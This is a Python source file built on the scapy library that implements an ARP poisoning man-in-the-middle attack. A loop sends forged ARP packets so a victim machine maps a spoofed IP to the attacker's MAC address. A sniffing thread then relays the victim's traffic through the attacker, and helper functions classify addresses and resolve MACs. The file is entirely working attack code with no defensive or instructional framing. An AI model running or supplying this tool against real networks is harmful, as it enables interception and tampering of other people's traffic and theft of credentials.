import scapy.all as scapy
import time
import sys
import re
import ipaddress
import threading

class ARP_Poisoning:
    def __init__(self, iface, packet_interval, victim_mac, victim_ip, ip_to_spoof, attacker_mac, attacker_ip):
        self.iface = iface
        self.packet_interval = packet_interval
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.ip_to_spoof = ip_to_spoof
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip

    def run(self):
        try:
            while True:
                # sending spoofed ARP packet to the victim
                arp = scapy.Ether(src=self.attacker_mac) / scapy.ARP(
                    psrc=self.ip_to_spoof,
                    hwsrc=self.attacker_mac,
                    pdst=self.victim_ip,
                    op="who-has",
                    hwdst=self.victim_mac
                )
                scapy.sendp(arp, iface=self.iface)
                time.sleep(self.packet_interval)
        except KeyboardInterrupt:
            print("Stopping ARP poisoning")

    def start_forarping(self):
        def forward_packet(pkt):
            if scapy.IP in pkt and scapy.Ether in pkt:
                ip = pkt[scapy.IP]
                ether = pkt[scapy.Ether]

                # From victim to server (spoofed IP)
                if ip.src == self.victim_ip and ip.dst == self.ip_to_spoof:
                    ether.src = self.attacker_mac
                    ether.dst = resolve_mac(self.ip_to_spoof, self.iface)
                    if ether.dst:
                        scapy.sendp(pkt, iface=self.iface, verbose=False)

                # From server to victim
                elif ip.src == self.ip_to_spoof and ip.dst == self.victim_ip:
                    ether.src = self.attacker_mac
                    ether.dst = self.victim_mac
                    scapy.sendp(pkt, iface=self.iface, verbose=False)

        thread = threading.Thread(target=lambda: scapy.sniff(
            iface=self.iface,
            filter="ip",
            prn=forward_packet,
            store=False
        ))
        thread.daemon = True
        thread.start()

def classify_address(address):
    """
    Classify a string as MAC address, IP address, or neither.

    Args:
        address (str): The address string to classify

    Returns:
        str: "MAC", "IP", or "ERROR"
    """
    if not isinstance(address, str):
        return "ERROR"

    # remove any whitespace
    address = address.strip()

    if not address:
        return "ERROR"

    # check for MAC address (colon-separated format only: XX:XX:XX:XX:XX:XX)
    mac_pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    if re.match(mac_pattern, address):
        return "MAC"

    try:
        ipaddress.ip_address(address)
        return "IP"
    except (ValueError, AttributeError):
        pass

    # if neither MAC nor IP
    return "ERROR"

def resolve_mac(ip, iface):
    """Sends an ARP request to resolve the MAC address for a given IP."""
    arp_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    ans, _ = scapy.srp(arp_req, timeout=2, iface=iface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Could not resolve MAC for {ip}")
        return None















